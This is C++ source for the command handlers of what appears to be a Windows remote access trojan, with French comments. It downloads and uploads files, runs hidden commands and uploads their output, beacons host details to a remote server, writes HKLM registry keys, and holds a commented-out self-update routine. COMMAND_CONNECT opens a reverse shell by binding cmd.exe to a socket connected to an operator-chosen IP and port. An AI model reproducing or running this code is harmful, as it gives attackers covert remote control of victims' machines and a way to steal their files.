#include "../include/function.h"
#include "../include/CCmdExec.h"
#include "../../shared/include/libc.h"
#include "../../shared/include/maindef.h"
#include <stdio.h>
#include <winsock2.h>

int COMMAND_download(API *pAPI, COMMAND *pCom) {// 1er param = src; 2ème param = dest
    DWORD dwDataLenght;
    char *pC;
    FILE *pFile;
    CHTTPClass *oHTTPClient;


    if (pCom->numParameters!=2)
       return _ERROR_CMD_INVALIDNUMBERPARAMETERS;
    
    oHTTPClient=new CHTTPClass(pAPI);
    oHTTPClient->SetURL(pCom->pFirstParameters->sParam);
    oHTTPClient->Connect();
    oHTTPClient->SendRequest();
    pC=oHTTPClient->ReadHTTPHeader();
     
    if (oHTTPClient->HTTPErrorCode(pC)==_HTTP_OK) {
       pFile=fopen(pCom->pFirstParameters->pNext->sParam,"wb");
       if (!pFile) {
                  
          delete(oHTTPClient);
          return _ERROR_EXE_FILENOTFOUND;
       }
       pC="";
       while (pC){
          pC=oHTTPClient->ReadHTTPData(&dwDataLenght);
          if (pC)
             if (fwrite(pC,sizeof(char),dwDataLenght,pFile)!=dwDataLenght)
             {
                pCom->commandResult=_ERROR_CMD_FILENOTCOMPLETE;
                fclose(pFile);
                delete(oHTTPClient);
                return _ERROR_CMD_FILENOTCOMPLETE;                                                              
             }
       }
       fclose(pFile); 
       pCom->commandResult=_ERROR_NO_ERROR;
     } else 
           pCom->commandResult=_ERROR_CMD_INVALIDHTTPCODE;
     delete(oHTTPClient);
     return pCom->commandResult;
}

int COMMAND_upload(API *pAPI, COMMAND *pCom) { // 1er param = userfile=src; 2ème param = URL
    DWORD dwDataLenght;
    char *pC;
    FILE *pFile;char sSrc[MAX_PARAMETERS_SIZE];char sDest[MAX_PARAMETERS_SIZE];
    CHTTPClass *oHTTPClient;

    if (pCom->numParameters!=2)
       return _ERROR_CMD_INVALIDNUMBERPARAMETERS;

    oHTTPClient=new CHTTPClass(pAPI);
    strncpy(sSrc,pCom->pFirstParameters->sParam,MAX_PARAMETERS_SIZE);
    strncpy(sDest,pCom->pFirstParameters->pNext->sParam,MAX_PARAMETERS_SIZE);

    oHTTPClient->SetURL(sDest);
  
    oHTTPClient->Connect();  
    oHTTPClient->SetPOSTData("MAX_FILE_SIZE=6000000");
    oHTTPClient->SetFileToUpload(sSrc);
    if (!oHTTPClient->SendRequest()) {
       pC=oHTTPClient->ReadHTTPHeader();
    
       if (oHTTPClient->HTTPErrorCode(pC)==_HTTP_OK)    
              pCom->commandResult=_ERROR_NO_ERROR;
       else
           pCom->commandResult=_ERROR_CMD_INVALIDHTTPCODE;
    } else
           pCom->commandResult=_ERROR_CMD_UPLOADFAILED;
    delete(oHTTPClient);
    return pCom->commandResult;    
}

int COMMAND_execute(API *pAPI, COMMAND *pCom) {  // 1er param = Commande to execute; 2ème param = Nom fichier à renvoyer
    CCmdExec *oExecute;int errorCode;
    char tmpFile[12];char tmpCom[255];
    FILE *pFile;
    COMMANDPARAMETERS parameters1;
    COMMANDPARAMETERS parameters2;
    COMMAND command1;
    
    if ((pCom->numParameters!=2)&&(pCom->numParameters!=3))
       return _ERROR_CMD_INVALIDNUMBERPARAMETERS;
    
    errorCode=_ERROR_NO_ERROR;
    
    if (pCom->numParameters!=2) {
    
        PROCESS_INFORMATION pinfo;
        STARTUPINFO sinfo;
	
	    memset(&sinfo, 0, sizeof(STARTUPINFO));
	    sinfo.cb = sizeof(sinfo);
	    sinfo.dwFlags = STARTF_USESHOWWINDOW;
	    sinfo.wShowWindow = SW_HIDE;
	    if (CreateProcess(NULL,pCom->pFirstParameters->sParam , NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE, NULL, NULL, &sinfo, &pinfo))
            errorCode=_ERROR_NO_ERROR;
        else
            errorCode=_ERROR_CMD_EXECFAILED;
            
        
    }  else {
       generateRandomFileName(tmpFile,12);
       pFile=fopen(tmpFile,"wb");
       oExecute = new CCmdExec(pCom->pFirstParameters->sParam);
       if (!oExecute->Execute(pFile)) 
       {

          fclose(pFile);remove(tmpFile);
          pCom->commandResult=_ERROR_CMD_EXECFAILED;
          delete(oExecute);
          return _ERROR_CMD_EXECFAILED;
       }
       fclose(pFile);
       delete(oExecute);
       command1.command=_CMD_DOWNLOAD;
       sprintf(tmpCom,"userfile=%s",tmpFile);
       strcpy(parameters1.sParam,tmpCom);
       strcpy(parameters2.sParam,pCom->pFirstParameters->pNext->sParam);
       parameters1.pNext=&parameters2;
       command1.pFirstParameters=&parameters1;
       command1.numParameters=2;
       if (COMMAND_upload(pAPI,&command1))
          errorCode=_ERROR_CMD_UPLOADFAILED;
       remove(tmpFile);
    }
    pCom->commandResult=errorCode;
    return errorCode;

}

int COMMAND_MessageBox(API *pAPI, COMMAND *pCom) {
    if (pCom->numParameters!=2)
       pCom->commandResult=_ERROR_CMD_INVALIDNUMBERPARAMETERS;
    else {
         MessageBox( HWND_DESKTOP, pCom->pFirstParameters->pNext->sParam,pCom->pFirstParameters->sParam, MB_OK );
         pCom->commandResult=_ERROR_NO_ERROR;
    }
    return pCom->commandResult;
}

/*
int COMMAND_Update(API *pAPI, COMMAND *pCom) {
    DWORD dwLenght;
    char stOldPath[MAX_PATH];
    char stCurrentPath[MAX_PATH];
    char *pOldPath;
    char *pCurrentPath;
    char updateName[MAX_PATH];
            
    if (pCom->numParameters!=1)
       return _ERROR_CMD_INVALIDNUMBERPARAMETERS;
      
    strcpy(stCurrentPath, GetCommandLine());
    
    pCurrentPath=stCurrentPath;
    if (*pCurrentPath=='"') {
       pCurrentPath++;
       *(pCurrentPath+strlen(pCurrentPath)-2)=0;
    }      
       
    strcpy(stOldPath, pCurrentPath);

    pOldPath=stOldPath+strlen(stOldPath);
    while (*pOldPath!='\\')
          pOldPath--;

    *(pOldPath)=0;
    pOldPath=stOldPath;
       
    sprintf(updateName,"%s\\%s",pOldPath,PROCESSUPDATENAME);
    if (*pOldPath=='"') {
       *(updateName+strlen(updateName)+1)=0;
       *(updateName+strlen(updateName))='"';
    }       

    if (rename(pCurrentPath,PROCESSUPDATENAME)){
       pCom->commandResult=_ERROR_CMD_UPDATERENAMEFAILED;
       return _ERROR_CMD_UPDATERENAMEFAILED;
    }

    COMMANDPARAMETERS parameters1;
    COMMANDPARAMETERS *parameters2;
    COMMAND command1; 
    
    parameters2=pCom->pFirstParameters;
    parameters2->pNext=&parameters1;
    
    strcpy(parameters1.sParam,pCurrentPath);
    parameters1.pNext=NULL;
    
    command1.command=_CMD_DOWNLOAD;
    command1.pFirstParameters=parameters2;
    command1.numParameters=2;
    COMMAND_download(pAPI,&command1);

    if (command1.commandResult!=_ERROR_NO_ERROR){

        rename(updateName,pCurrentPath);
    }
    else {
         pCom->commandResult=command1.commandResult;
         FinalizeCommand(pAPI,pCom);
         PROCESS_INFORMATION pinfo;
	     STARTUPINFO sinfo;
	
	     memset(&sinfo, 0, sizeof(STARTUPINFO));
	     sinfo.cb = sizeof(sinfo);
	     sinfo.dwFlags = STARTF_USESHOWWINDOW;
	     sinfo.wShowWindow = SW_HIDE;
	     if (CreateProcess(NULL, GetCommandLine(), NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE, NULL, NULL, &sinfo, &pinfo)){
            pCom->commandResult=_ERROR_NO_ERROR;
            
            exit(0);
         }
    }
    
    return pCom->commandResult;
}*/

int COMMAND_getInfo(API *pAPI, COMMAND *pCom) { // 1er param = userfile=src; 2ème param = URL
    DWORD dwDataLenght;
    char *pC;
    FILE *pFile;char sDest[MAX_PARAMETERS_SIZE];
    char sDATA[MAX_BUFFER];
    CHTTPClass *oHTTPClient;

    if (pCom->numParameters!=1) {
       pCom->commandResult=_ERROR_CMD_INVALIDNUMBERPARAMETERS;
       return _ERROR_CMD_INVALIDNUMBERPARAMETERS;
    }
    sprintf(sDATA,"installedRep=%s&installedKey=%s&tmpDirectory=%s&osversion=%s&version=%s",pAPI->sInstalledRep,pAPI->sInstalledKey,pAPI->sTmpDirectory,pAPI->sWindowsVersion,_VERSION);
    
    oHTTPClient=new CHTTPClass(pAPI);
    strncpy(sDest,pCom->pFirstParameters->sParam,MAX_PARAMETERS_SIZE);
    
    oHTTPClient->SetURL(sDest);
    
    oHTTPClient->Connect();  
    oHTTPClient->SetPOSTData(sDATA);
    oHTTPClient->SendRequest();
    pC=oHTTPClient->ReadHTTPHeader();
    
    if (oHTTPClient->HTTPErrorCode(pC)==_HTTP_OK)  
           pCom->commandResult=_ERROR_NO_ERROR;
    else 
           pCom->commandResult=_ERROR_CMD_INVALIDHTTPCODE;

    pC=oHTTPClient->ReadHTTPData(&dwDataLenght);

    delete(oHTTPClient);
    return pCom->commandResult;    
}

int COMMAND_SetRegKey(API *pAPI, COMMAND *pCom) {
    DWORD dwLenght=0;
    char * sKeyName;
    HKEY key;
    
    if (pCom->numParameters!=4) {
       pCom->commandResult=_ERROR_CMD_INVALIDNUMBERPARAMETERS;
       return _ERROR_CMD_INVALIDNUMBERPARAMETERS;
    }

	if(pAPI->pRegCreateKey(HKEY_LOCAL_MACHINE,pCom->pFirstParameters->pNext->sParam,&key)==ERROR_SUCCESS) {
         if(pAPI->pRegOpenKey(HKEY_LOCAL_MACHINE,pCom->pFirstParameters->pNext->sParam,&key)==ERROR_SUCCESS) {                                                                                  
            if (pCom->pFirstParameters->sParam[0]=='d') {
               dwLenght=atoi(pCom->pFirstParameters->pNext->pNext->pNext->sParam);
               dwLenght=pAPI->pRegSetValueEx(key,pCom->pFirstParameters->pNext->pNext->sParam,0,REG_DWORD,(BYTE *)&dwLenght,sizeof(dwLenght));
            } else
               dwLenght=pAPI->pRegSetValueEx(key,pCom->pFirstParameters->pNext->pNext->sParam,0,REG_SZ,(BYTE *)pCom->pFirstParameters->pNext->pNext->pNext->sParam,strlen(pCom->pFirstParameters->pNext->pNext->pNext->sParam)); 

            if (dwLenght==ERROR_SUCCESS)
               pCom->commandResult=_ERROR_NO_ERROR;
            else
                pCom->commandResult=_ERROR_CMD_REGKEYWRITEFAILED;
                      
            pAPI->pRegCloseKey(key);
            return pCom->commandResult;
	     }
    }
    pCom->commandResult=_ERROR_CMD_REGKEYWRITEFAILED;
    return _ERROR_CMD_REGKEYWRITEFAILED;
}

int COMMAND_GetRegKey(API *pAPI, COMMAND *pCom) {
    DWORD dwLenght=0;
    char * sKeyName;DWORD *pDw;
    HKEY key;DWORD lpType=REG_SZ;char KeyName[MAX_PATH];
    
    if (pCom->numParameters!=2) {
       pCom->commandResult=_ERROR_CMD_INVALIDNUMBERPARAMETERS;
       return _ERROR_CMD_INVALIDNUMBERPARAMETERS;
    }
    pCom->commandResult=_ERROR_CMD_REGKEYREADFAILED;
    dwLenght=MAX_PATH;
    if(pAPI->pRegOpenKeyEx(HKEY_LOCAL_MACHINE,pCom->pFirstParameters->sParam,0,KEY_READ,&key)==ERROR_SUCCESS)
            if (pAPI->pRegQueryValueEx(key,pCom->pFirstParameters->pNext->sParam,0,&lpType ,(BYTE *)pCom->sCommandResult,&dwLenght)==ERROR_SUCCESS) {
                   pCom->commandResult=_ERROR_NO_ERROR;

                   if (lpType==REG_DWORD){
                      pDw=(DWORD *) pCom->sCommandResult;
                      dwLenght=*pDw;
                      sprintf(pCom->sCommandResult,"%d",dwLenght);
                   }
             }
    return pCom->commandResult;
}

int COMMAND_TTS(API *pAPI, COMMAND *pCom) {
    if (pCom->numParameters!=1) {
       pCom->commandResult=_ERROR_CMD_INVALIDNUMBERPARAMETERS;
       return _ERROR_CMD_INVALIDNUMBERPARAMETERS;
    } 
    pCom->commandResult=_ERROR_NO_ERROR;

    if (pCom->pFirstParameters->sParam[0]=='0')
       pAPI->lTimeToSleep=_DELAYCOMMANDER;
    else
        pAPI->lTimeToSleep=atoi(pCom->pFirstParameters->sParam);
    
    if (pAPI->lTimeToSleep<29000) {

       pCom->commandResult=_ERROR_CMD_TTSNOTGOOD;
       pAPI->lTimeToSleep=_DELAYCOMMANDER;
    }

    return pCom->commandResult;
}

int COMMAND_CONNECT(API *pAPI, COMMAND *pCom) {
     
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
     WSADATA WSAData;
     SOCKET sock;
     if (pCom->numParameters!=2) {
       pCom->commandResult=_ERROR_CMD_INVALIDNUMBERPARAMETERS;
       return _ERROR_CMD_INVALIDNUMBERPARAMETERS;
     } 
     
     pAPI->pWSAStartup(MAKEWORD(2,0),&WSAData);   
     sock = pAPI->pWSASocket(AF_INET,SOCK_STREAM,0,NULL,0,0);

     SOCKADDR_IN sin;
     sin.sin_addr.s_addr = pAPI->pInet_Addr(pCom->pFirstParameters->sParam);
     sin.sin_family = AF_INET;
     sin.sin_port = pAPI->pHtons(atoi(pCom->pFirstParameters->pNext->sParam));
     
     if (pAPI->pConnect(sock,(SOCKADDR *)&sin,sizeof(sin))) {
        pCom->commandResult=_ERROR_CMD_CONNECTFAILED;
        return 1;
     }
     
     ZeroMemory(&si,sizeof(si));
     ZeroMemory(&pi,sizeof(pi));
     si.cb = sizeof(si);
     si.dwFlags=STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;

     si.hStdError=si.hStdInput=si.hStdOutput=(HANDLE)sock;
     CreateProcess( NULL, "cmd.exe", NULL, NULL, 1,0, NULL, NULL, &si, &pi );
     WaitForSingleObject(pi.hProcess,INFINITE);
     pAPI->pCloseSocket(sock);
     pAPI->pWSACleanUP();
     
     pCom->commandResult=_ERROR_NO_ERROR;
     return _ERROR_NO_ERROR;
}
